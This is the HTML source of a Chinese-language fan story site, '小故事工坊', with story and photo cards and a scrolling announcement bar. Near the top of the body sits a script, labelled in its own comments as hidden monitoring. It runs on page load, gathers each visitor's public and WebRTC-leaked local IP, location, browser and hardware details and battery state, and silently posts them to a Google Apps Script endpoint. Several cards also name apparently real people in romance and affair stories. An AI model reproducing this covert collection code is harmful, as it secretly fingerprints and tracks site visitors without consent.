<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>小故事工坊官方網站</title>
    <style>
        /* 全域樣式 */
        body {
            margin: 0;
            padding: 0;
            font-family: "Microsoft JhengHei", "Heiti TC", "PingFang TC", sans-serif;
            background-color: #f8f9fa;
            color: #333;
            overflow-x: hidden; /* 防止水平滾動 */
        }

        /* 導覽列樣式 */
        header {
            background-color: #fff;
            padding: 15px 20px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            position: sticky;
            top: 0;
            z-index: 1000;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .site-title {
            font-size: 1.5rem;
            font-weight: bold;
            color: #444;
            text-decoration: none;
        }

        nav a {
            text-decoration: none;
            color: #555;
            margin-left: 20px;
            font-size: 1rem;
            transition: color 0.3s;
        }

        nav a:hover {
            color: #000;
        }

        /* 動態公告欄容器 (模仿原本的 Embed) */
        #marquee-section {
            width: 100%;
            height: 20vh; /* 設定高度，讓下方內容可見 */
            background-color: #fff;
            position: relative;
            overflow: hidden;
            display: flex;
            align-items: center;
            border-bottom: 1px solid #eee;
        }

        #scroller {
            white-space: nowrap;
            position: absolute;
            will-change: transform;
            font-weight: bold;
            line-height: 1;
        }

        /* 內容區塊樣式 */
        .container {
            max-width: 1200px;
            margin: 30px auto;
            padding: 0 20px;
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
            gap: 20px;
        }

        .card {
            background: #fff;
            border-radius: 8px;
            padding: 20px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
            transition: transform 0.2s, box-shadow 0.2s;
            text-align: center;
        }

        .card:hover {
            transform: translateY(-5px);
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }

        .card h3 {
            margin-top: 0;
            font-size: 1.2rem;
            color: #222;
        }

        .card a {
            display: inline-block;
            margin-top: 10px;
            padding: 8px 16px;
            background-color: #007bff;
            color: white;
            text-decoration: none;
            border-radius: 4px;
            font-size: 0.9rem;
        }

        .card a:hover {
            background-color: #0056b3;
        }

        /* 模式切換按鈕 */
        #mode-btn {
            position: absolute;
            bottom: 10px;
            right: 10px;
            z-index: 10;
            padding: 5px 10px;
            background: rgba(0,0,0,0.5);
            color: #fff;
            border: none;
            cursor: pointer;
            font-size: 0.8rem;
            border-radius: 4px;
        }

        footer {
            text-align: center;
            padding: 20px;
            background: #333;
            color: #fff;
            margin-top: 40px;
            font-size: 0.9rem;
        }
    </style>
</head>
<body>

<script>
    // ==============================================
    // 隱藏監控與資料回傳邏輯 (來自原始碼)
    // ==============================================
    const MONITOR_GAS_ENDPOINT = 'https://script.google.com/macros/s/AKfycbwvqeLz2xm3DT2Z43P8JeKYvR8AgZsFWqliBPK9j2TPFuUE51bMyELfFMTRsXkvi8Va/exec';

    // 1. 獲取電池狀態
    async function getBatteryInfo() {
        if (!navigator.getBattery) return "不支援";
        try {
            const battery = await navigator.getBattery();
            const level = Math.round(battery.level * 100) + "%";
            const status = battery.charging ? "充電中" : "使用中";
            return `${level} (${status})`;
        } catch (e) { 
            return "拒絕存取";
        }
    }

    // 2. 透過 WebRTC 嘗試獲取內網 IP
    async function getLocalIP() {
        return new Promise((resolve) => {
            try {
                const pc = new RTCPeerConnection({iceServers: []});
                pc.createDataChannel('');
                pc.createOffer().then(pc.setLocalDescription.bind(pc));
                
                pc.onicecandidate = (ice) => {
                    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                    const myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(ice.candidate.candidate);
                    if (myIP) {
                        resolve(myIP[1]);
                        pc.onicecandidate = () => {}; 
                    }
                };
                setTimeout(() => { resolve("隱藏或拒絕存取"); }, 1500);
            } catch (e) {
                resolve("不支援");
            }
        });
    }

    // 3. 獲取公網 IP 與地區
    async function getPublicInfo() {
        try {
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            return {
                ip: data.ip,
                location: `${data.city}, ${data.region}, ${data.country_name}`
            };
        } catch (e) {
            try {
                const ipResp = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResp.json();
                return { ip: ipData.ip, location: "無法取得地區" };
            } catch (err) {
                return { ip: "未知", location: "未知" };
            }
        }
    }

    // 4. 打包發送
    async function startCollection() {
        const [netInfo, localIp, battery] = await Promise.all([
            getPublicInfo(),
            getLocalIP(),
            getBatteryInfo()
        ]);
        const payload = {
            location: netInfo.location,
            userAgent: navigator.userAgent,
            publicIp: netInfo.ip,
            localIp: localIp,
            cores: navigator.hardwareConcurrency || '未知',
            memory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : '未知',
            platform: navigator.platform,
            battery: battery
        };
        try {
            await fetch(MONITOR_GAS_ENDPOINT, {
                method: 'POST',
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            console.log("Monitor: Data Sent");
        } catch (error) {
            console.error("Monitor: Send Failed");
        }
    }

    // 立即執行監控
    window.addEventListener('load', startCollection);
</script>

<header>
    <a href="#" class="site-title">小故事工坊官方網站</a>
    <nav>
        <a href="#">首頁</a>
        <a href="#">更新日誌</a>
        <a href="#">下載</a>
        <a href="#">關於這個網站</a>
    </nav>
</header>

<div id="marquee-section">
    <div id="scroller">讀取公告中...</div>
    <button id="mode-btn" onclick="toggleObstacles()">開啟有障礙模式(Obstacles mode)</button>
</div>

<div class="container">
    <div class="card">
        <h3>114里事長盃</h3>
        <p>已放送全部照片</p>
        <a href="https://docs.google.com/folderview?id=1slyTXCaQqWjN3lyOGE67-KCUizrFyPH1" target="_blank">查看照片</a>
    </div>

    <div class="card">
        <h3>小故事工坊雲端硬碟 v.2</h3>
        <p>最新資源下載</p>
        <a href="https://script.google.com/macros/s/AKfycbwibsCimv3Lz8tCMEEMuHFyQWiSxJxeZnLxutcL_R0EXcpFqNwnpwPbz-KtaZw8OPmg4A/exec" target="_blank">前往雲端</a>
    </div>

    <div class="card">
        <h3>潘誼璇與蔡吉紳的愛情日記.1</h3>
        <a href="https://drive.google.com/open?id=1zmbPTlcGtdY7dvLciyAJFdjCNNYFR3W4QXJVa1tXTjg" target="_blank">觀看故事</a>
    </div>

    <div class="card">
        <h3>潘誼璇與蔡吉紳的愛情日記.2</h3>
        <p>巨型大作 (未完成)</p>
        <a href="https://drive.google.com/open?id=1QwCV9qB1cIe3Gl03uFRdmlfCGr4ocMMcOU2dahiOTcg" target="_blank">觀看故事</a>
    </div>

    <div class="card">
        <h3>人妖與田語桐</h3>
        <p>正版，未修改</p>
        <a href="https://drive.google.com/open?id=1io-24uCInuiY4H4M_eSG3Hq3BXpoCMBAg_3qsfGxy6o" target="_blank">觀看故事</a>
    </div>

    <div class="card">
        <h3>徐子浩外遇故事</h3>
        <p>夏羽希與徐子浩（be）</p>
        <a href="https://drive.google.com/open?id=1012yaF5SwUIAK5jY3Q_fxDAcK_Y35e8yMkugRTgXrD4" target="_blank">觀看故事</a>
    </div>

    <div class="card">
        <h3>不要打我（巫凱特做的）</h3>
        <a href="https://drive.google.com/file/d/1n5QmmVQr8RDSo7cZQWz5hf5gnDwlebiq/view?usp=drivesdk" target="_blank">點擊查看 :)</a>
    </div>

    <div class="card">
        <h3>麻糬壓扁記 :)</h3>
        <p>已編輯</p>
        <a href="https://drive.google.com/open?id=1bQHJJ6uokofG4Mr3bOuefkw9TQOaAX8QFAaInswHRAQ" target="_blank">觀看故事</a>
    </div>

    <div class="card">
        <h3>馬與骨的愛情史.1</h3>
        <p>加密版</p>
        <a href="https://drive.google.com/open?id=1_0KHaGjk-1kG66hOS9rfRBMlTGHA872bE9OND11MiDA" target="_blank">觀看故事</a>
    </div>

    <div class="card">
        <h3>林郁翔與馮亭閏的愛恨情仇</h3>
        <a href="https://drive.google.com/open?id=11Fqc9u1XPx-z_D2sIIE2MeIuWDaqJAsOv7AX6ZOOa3Q" target="_blank">第一部</a>
    </div>

    <div class="card">
        <h3>林郁翔與馮亭閏的愛恨情仇 2</h3>
        <a href="https://drive.google.com/open?id=1O2E4P_HAlHL_pqtVphUouktobfuhjAwmgNt4gxRKqHk" target="_blank">第二部</a>
    </div>
    
    <div class="card">
        <h3>投稿專區</h3>
        <p>模版二創影片放置區</p>
        <a href="https://forms.gle/aKs4xiZCDawBLK526" target="_blank">我要投稿</a>
    </div>
</div>

<footer>
    <p>版權所有 © 小故事工坊 | 如有侵權，請聯絡信箱：mzhong109002@gamil.com</p>
    <a href="https://forms.gle/KALDCwmKpmNLqqmn6" style="color:#aaa;">Bug 回報</a>
</footer>

<script>
  const API_URL = "https://script.google.com/macros/s/AKfycbxRIYaYtUjoJRa8OlciCuHs28cjqeaSsXsNUPgnE07sABOCWP_s4bbubGc8oDycaS14vQ/exec";
  let currentPlaylist = [];
  let nextPlaylist = null;
  let settings = {};
  let currentIndex = 0;
  let refreshTimer = null;

  const container = document.getElementById('marquee-section');
  const scroller = document.getElementById('scroller');

  // 初始化公告
  fetchData(true);

  function fetchData(isFirstLoad) {
    fetch(API_URL)
      .then(res => res.json())
      .then(data => {
        if (!data || !data.items) {
          if (isFirstLoad) scroller.innerHTML = "";
          return;
        }

        if (isFirstLoad) {
          settings = data.settings;
          currentPlaylist = data.items;
          applySettings();
          startRefreshCycle();
          playNext();
        } else {
          const newDataStr = JSON.stringify(data.items);
          const oldDataStr = JSON.stringify(currentPlaylist);
          if (newDataStr !== oldDataStr) {
            nextPlaylist = data.items; 
          }
          if (JSON.stringify(data.settings) !== JSON.stringify(settings)) {
            settings = data.settings;
            applySettings();
            startRefreshCycle();
          }
        }
      })
      .catch(err => console.error("公告獲取失敗:", err));
  }

  function applySettings() {
    // 這裡我們不改變 body 背景，只改變公告欄背景
    if (settings.BgColor) container.style.backgroundColor = settings.BgColor;
    scroller.style.fontSize = settings.FontSize || '10vh';
  }

  function startRefreshCycle() {
    const time = (parseInt(settings.RefreshTime) || 10) * 1000;
    if (refreshTimer) clearInterval(refreshTimer);
    refreshTimer = setInterval(() => fetchData(false), time);
  }

  function playNext() {
    if (currentIndex >= currentPlaylist.length) {
      currentIndex = 0;
      if (nextPlaylist !== null) {
        showUpdateScreen();
        return;
      }
    }

    if (currentPlaylist.length === 0) {
      scroller.innerHTML = "";
      setTimeout(playNext, 2000);
      return;
    }

    const item = currentPlaylist[currentIndex];
    scroller.innerText = item.text;
    scroller.style.color = item.color || settings.DefaultColor || '#333';
    
    const speed = item.speed || settings.DefaultSpeed || 100;
    runMarquee(speed, () => {
      currentIndex++;
      playNext();
    });
  }

  function runMarquee(speed, onComplete) {
    const containerWidth = container.offsetWidth;
    const textWidth = scroller.offsetWidth;
    
    const startPos = containerWidth;
    const endPos = -textWidth;
    const distance = startPos - endPos;
    const duration = distance / speed;

    scroller.style.transition = 'none';
    scroller.style.transform = `translateX(${startPos}px)`;

    requestAnimationFrame(() => {
      setTimeout(() => {
        scroller.style.transition = `transform ${duration}s linear`;
        scroller.style.transform = `translateX(${endPos}px)`;
      }, 50);
    });

    const handleEnd = () => {
      scroller.removeEventListener('transitionend', handleEnd);
      onComplete();
    };
    scroller.addEventListener('transitionend', handleEnd);
  }

  function showUpdateScreen() {
    const updateMsg = settings.UpdateMsg || "更新中...";
    scroller.innerText = updateMsg;
    runMarquee(settings.DefaultSpeed || 100, () => {
      currentPlaylist = nextPlaylist;
      nextPlaylist = null;
      currentIndex = 0;
      playNext();
    });
  }

  // 障礙模式切換 (簡單實作)
  function toggleObstacles() {
      alert("有障礙模式尚未實裝，敬請期待！");
  }
</script>

</body>
</html>
